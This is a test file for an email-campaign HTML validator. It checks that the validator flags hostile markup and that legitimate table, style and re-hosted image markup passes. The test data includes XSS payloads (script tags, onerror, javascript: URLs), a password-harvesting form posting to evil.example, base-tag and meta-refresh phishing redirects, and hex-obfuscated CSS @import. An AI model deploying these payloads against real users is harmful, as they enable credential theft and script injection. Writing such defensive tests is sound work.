import { describe, expect, test } from "vitest";
import {
  MAX_HTML_DOC_CHARS,
  emailHtmlDocContentIsEmpty,
  findHtmlDocHazard,
  validateEmailHtmlDocument,
} from "./emailHtmlDoc";

describe("findHtmlDocHazard — adversarial patterns", () => {
  test.each([
    ["<script>alert(1)</script>", "a <script> tag"],
    ["<p>hi</p><script src=\"//evil\"></script>", "a <script> tag"],
    ['<img src="x" onerror="alert(1)">', "an inline event handler attribute"],
    ['<a href="javascript:alert(1)">click</a>', "a javascript: URL"],
    ['<iframe src="https://evil.example"></iframe>', "an <iframe> tag"],
    ["<object data=\"evil.swf\"></object>", "an <object> tag"],
    ["<embed src=\"evil.swf\">", "an <embed> tag"],
    ['<a href="VBScript:msgbox(1)">x</a>', "a vbscript: URL"],
    ['<img src="data:text/html;base64,PHNjcmlwdD4=">', "a non-image data: URL"],
  ])("flags %s", (html, expected) => {
    expect(findHtmlDocHazard(html)).toBe(expected);
  });

  test("legit table/style markup is clean", () => {
    const html =
      '<table width="600" style="background:#fff"><tr><td style="padding:16px"><img src="https://cdn.example.com/a.png" alt="Hi"></td></tr></table>';
    expect(findHtmlDocHazard(html)).toBeNull();
  });

  test("a legitimate data: image URL is clean", () => {
    expect(
      findHtmlDocHazard('<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==">'),
    ).toBeNull();
  });

  // ── Adversarial-review finding #5 (2026-07-30, HIGH): the write-time
  // backstop only covered 9 patterns and missed a whole class the real
  // sanitizer already handles — a direct `updateCampaignDoc` call (compose-
  // gated, but callable from devtools/a script, and what autosave itself
  // uses) could land a credential-harvesting form, a tracking <link>, a
  // <base> hijack, an open-redirect <meta refresh>, or obfuscated CSS
  // verbatim into a send. These are the exact NEGATIVE-space payloads the
  // finding named that the OLD 9-pattern list did not catch. ──────────────
  describe("finding #5 — expanded hazard coverage", () => {
    test.each([
      ['<form action="https://evil.example/steal"><input name="pw"></form>', "a <form> tag"],
      ['<link rel="stylesheet" href="https://evil.example/x.css">', "a <link> tag"],
      ['<base href="https://evil.example/">', "a <base> tag"],
      [
        '<meta http-equiv="refresh" content="0;url=https://evil/phish">',
        "a <meta http-equiv> tag",
      ],
      // The exact case-insensitive/attribute-order variants a naive check
      // could still miss.
      ['<META HTTP-EQUIV="Refresh" CONTENT="0;url=https://evil/phish">', "a <meta http-equiv> tag"],
      ['<meta content="0;url=https://evil/phish" http-equiv="refresh">', "a <meta http-equiv> tag"],
    ])("flags %s", (html, expected) => {
      expect(findHtmlDocHazard(html)).toBe(expected);
    });

    test("[exact payload] catches CSS url(javascript:...) inside a style attribute", () => {
      const hazard = findHtmlDocHazard('<div style="background:url(javascript:alert(1))">x</div>');
      expect(hazard).not.toBeNull();
    });

    test("[exact payload] catches @import obfuscated behind a CSS hex escape", () => {
      const hazard = findHtmlDocHazard("<style>@\\69 mport url(https://evil/x.css)</style>");
      expect(hazard).not.toBeNull();
    });

    test("catches a protocol-relative CSS url() reference (never a legitimate output of the import pipeline)", () => {
      const hazard = findHtmlDocHazard('<div style="background:url(//evil.example/track.gif)">x</div>');
      expect(hazard).not.toBeNull();
    });

    test("a legitimately-imported doc (charset/color-scheme meta, no http-equiv, real re-hosted https images) stays clean", () => {
      const html =
        '<html><head><meta charset="utf-8"><meta name="color-scheme" content="light dark"></head>' +
        '<body><table><tr><td style="padding:16px;color:#111"><img src="https://storage.convex.example/rehosted-1.png" alt="Hi"></td></tr></table></body></html>';
      expect(findHtmlDocHazard(html)).toBeNull();
    });
  });
});

describe("validateEmailHtmlDocument", () => {
  test("accepts { html } and returns it trimmed-of-nothing (verbatim)", () => {
    const result = validateEmailHtmlDocument({ html: "<p>Hello</p>" });
    expect(result).toEqual({ ok: true, doc: { html: "<p>Hello</p>" } });
  });

  test("rejects a non-object doc", () => {
    expect(validateEmailHtmlDocument("just a string").ok).toBe(false);
    expect(validateEmailHtmlDocument(null).ok).toBe(false);
    expect(validateEmailHtmlDocument([1, 2]).ok).toBe(false);
  });

  test("rejects a missing/non-string html field", () => {
    expect(validateEmailHtmlDocument({}).ok).toBe(false);
    expect(validateEmailHtmlDocument({ html: 42 }).ok).toBe(false);
  });

  test("accepts blank/whitespace-only html — a fresh row starts empty (mirrors blocks'/tiptap's empty-doc-at-create precedent); only submit/send blocks nothing", () => {
    const result = validateEmailHtmlDocument({ html: "   \n  " });
    expect(result).toEqual({ ok: true, doc: { html: "   \n  " } });
  });

  test("rejects oversized html", () => {
    const result = validateEmailHtmlDocument({ html: "x".repeat(MAX_HTML_DOC_CHARS + 1) });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toMatch(/too large/i);
  });

  test("rejects hostile html even when handed directly (bypassing the import action)", () => {
    const result = validateEmailHtmlDocument({ html: "<script>alert(1)</script>" });
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toMatch(/script/i);
  });
});

describe("emailHtmlDocContentIsEmpty", () => {
  test("empty for non-objects and blank html", () => {
    expect(emailHtmlDocContentIsEmpty(null)).toBe(true);
    expect(emailHtmlDocContentIsEmpty({})).toBe(true);
    expect(emailHtmlDocContentIsEmpty({ html: "   " })).toBe(true);
  });

  test("non-empty once real html is present", () => {
    expect(emailHtmlDocContentIsEmpty({ html: "<p>Hi</p>" })).toBe(false);
  });
});
